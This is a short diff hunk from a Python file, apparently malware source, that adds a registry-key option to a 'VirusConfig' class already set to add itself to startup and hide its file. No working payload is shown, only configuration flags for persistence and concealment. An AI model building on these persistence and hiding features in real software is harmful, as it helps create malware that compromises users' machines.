@@ -140,3 +140,4 @@ class Virus(object):
 class VirusConfig:
     ADD_TO_STARTUP = True
     HIDE_FILE = True
+    ADD_REG_KEY = True
